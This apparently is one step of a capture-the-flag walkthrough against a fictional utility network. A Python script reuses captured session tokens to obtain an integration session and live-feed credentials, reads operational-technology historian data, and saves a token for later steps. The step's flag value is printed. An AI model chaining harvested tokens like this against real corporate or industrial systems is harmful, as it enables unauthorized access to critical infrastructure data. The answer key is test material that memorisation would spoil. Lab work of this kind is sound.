Requires W06.3 (Metabase planner session). Resolve the active data binding and read
the live process feed through the isolated integration gateway.

read-data.arwc.test presents the ARWC native (edge) certificate, so verify with the
CA bundle `/tmp/arwc-ca-bundle.pem` (it also covers the corporate services).

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
planner = pathlib.Path("receipts/planner-session").read_text().strip()

def get(url, headers):
    return json.loads(urllib.request.urlopen(urllib.request.Request(url, headers=headers), context=ctx).read())

# 1. Get the integration session from the business workplace integration contract.
contract = get("https://business-workplace.arwc.test/api/integration-contracts/current",
               {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"})
integration_session = contract["integration_session"]   # record.integration_client == INT-CRR-08

# 2. Exchange it at planning-data for the current feed binding and the live-feed credentials.
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc",
     "X-ARWC-Planner-Session": planner,
     "X-ARWC-Integration-Session": integration_session,
     "Content-Type": "application/json"}
body = json.dumps({
    "integration_client": "INT-CRR-08", "report_binding": "REC-CRR-DP3-17",
    "scope": "OG-CRR-02/read", "feed": "FEED-OG2-R21",
}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/api/integration-sessions",
                            data=body, headers=h, method="POST"), context=ctx).read())
print("record_id:", d["record"]["record_id"])        # FEED-OG2-R21
print("flag:", d["flag"])                              # FLAG{2085674d8d2c8b96}
process_session = d["process_session"]                 # the process-view session token for W19-W30
reader = d["operating_reader"]                         # {"username": "operating-reader", "password": ...}
live_feed = d["live_feed"]                             # https://read-data.arwc.test/api/operating-history

# 3. Read the live operating-history feed with the issued operating-reader identity.
auth = "Basic " + __import__("base64").b64encode(
    (reader["username"] + ":" + reader["password"]).encode()).decode()
feed = json.loads(urllib.request.urlopen(
    urllib.request.Request(live_feed, headers={"Authorization": auth}), context=ctx).read())
print("schema:", feed["schema"])                       # arwc.operating-history/v1
print("samples:", len(feed["samples"]))                # fresh OT process samples (last 5 minutes)

pathlib.Path("receipts").mkdir(exist_ok=True)
pathlib.Path("receipts/process-session").write_text(process_session)
```

Save `d["process_session"]`, not `integration_session`. The `integration_session` is the
contract handle used only in the exchange header. The `process_session` field in the
integration-session response is the process-view session token. W19-W30 send it as the
bearer token to `process-view.arwc.test`; the wrong token returns 403.

The integration gateway (a-data-bridge) maps INT-CRR-08 and report binding REC-CRR-DP3-17
to the live feed FEED-OG2-R21; stale FEED-OG2-R19 is rejected. The live samples come from
the OT historian's `public.dmz_process_history` view (level_m, usable_volume_ml, total_flow_m3s),
read only through the bridge's operating-reader identity.

Flag: `FLAG{2085674d8d2c8b96}` in the top-level `flag` field of the integration-session response.
